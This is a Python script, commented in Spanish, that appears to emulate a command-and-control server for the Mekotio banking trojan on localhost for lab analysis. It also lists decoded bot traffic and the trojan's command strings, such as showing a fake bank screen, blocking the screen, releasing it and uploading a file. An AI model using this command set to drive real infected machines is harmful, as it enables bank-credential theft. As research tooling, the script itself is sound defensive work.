# Simula un C&C para interactuar con un BOT Mekotio en una red controlada
import socketserver
import time

#netstat -ano 1| findstr -i SYN_SENT
class MyTCPHandler(socketserver.BaseRequestHandler):


    def handle(self):
        self.data = self.request.recv(2048).strip()
        print("{} wrote:".format(self.client_address[0]))
        print(self.data)
        self.request.sendall(b'<|WY|>')
        #self.request.sendall(b'qpxvdddk')
        #self.request.sendall(b'orca3whiid8gota@<|iuqm|>')
        self.request.sendall(b'jazcsalfbu9m4@0') #Muestra Pantalla 1
        time.sleep(40)
        self.request.sendall(b'orca3whiid8gota@<|iuqm|>') #Muestra Bloqueo
        time.sleep(40)
        self.request.sendall(b'jambqxIbx') #Libera
        time.sleep(3)
        self.request.sendall(b'jambqxIbx') #Libera
        time.sleep(16)
        self.data = self.request.recv(2048).strip()
        print("{} wrote:".format(self.client_address[0]))
        print(self.data)
        time.sleep(30)
        
if __name__ == "__main__":
    HOST, PORT =  "localhost", 7958

    with socketserver.TCPServer((HOST, PORT), MyTCPHandler) as server:

        server.serve_forever()
'''
#<|SNUNFHXQU|>
#<|WY|> / Pregunta nombre de bot.
#<|xywz|>1--09-06-N-96<|>32 - Windows 8.16.39600<|>TEMPO tempo123 windows defender-santandercomar<|>TEMPO tempo123<<|6//&M31R543V36m!santandercomar
#<|stygqwokui|>8259478<<|<|iuqm|>
#<|ywloz|><|dlpeaUoilF|>santander3.zip<<|67547<|iuqm|>
#<|SLUT|><|Eoadivn|>###TEMPO
#orca3whiid8gota@<|iuqm|>  bloquea
#<|SLUT|>
#iedabajamn<|yJuSakR|>86<|>104<<|<|uubkSaRA3yJ|>86<|>104<<|<|yJuSakR|>261<|>101<<|<|uubkSaRA3yJ|>261<|>101<<|<|yJuSakR|>1357<|>612<<|<|uubkSaRA3yJ|>1357<|>612<<|<|yJuSakR|>1359<|>135<<|<|uubkSaRA3yJ|>1359<|>134<<|<|iuqm|>
#<|SLUT|>
#<|yJuSakR|>41<|>101<<|<|uubkSaRA3yJ|>41<|>101<<|<|yJuSakR|>75<|>255<<|<|uubkSaRA3yJ|>75<|>255<<|<|yJuSakR|>722<|>293<<|<|uubkSaRA3yJ|>722<|>292<<|<|yJuSakR|>724<|>290<<|<|uubkSaRA3yJ|>724<|>290<<|<|yJuSakR|>263<|>455<<|<|uubkSaRA3yJ|>263<|>455<<|<|yJuSakR|>262<|>457<<|<|uubkSaRA3yJ|>262<|>457<<|<|iuqm|>
#<|SLUT|>
#cYvlbAkvltcYvlbAkvltcYvlbAkvltcYvlbAkvltcYvlbAkvltcYvlbAkvltcYvlbAkvlt<|iuqm|><|iuqm|><|iuqm|><|iuqm|>
#1465B74AEA6EFC141ED755AAB9A9AAAB8EFB60AAACDD6EA78DF67F918A899CFB77EC67A3B2CC50B4D754C8B9C5B285EF71FD7EFB1D01
#<|IYWXZFTJQ|>
Received b'jambqxIbx' Congela/Descongela
Received b'ce3ldar2mi@0\xa70$0%0'   Imagen 1
Received b'cm3decdo2tri@0\xa70$0%0'  Imagen 2
Received b'jazcsalfbu9m4@0\xa70$0%0'  Imagen 3
Received b'rrpdlhzuicd' block de notas
Received b'<|dlpeaUoilF|>santaar.zip<<|67547' Upload
Received b'qpxvdddk' mensaje error contraseña

..............muestra y libera---------------
Received b'jazcsalfbu9m4@0\xa70$0%0'
Received b'pduaoepqbv'
Received b'fhk3iwa8o'
Received b'jambqxIbx'
-----------------------------------------
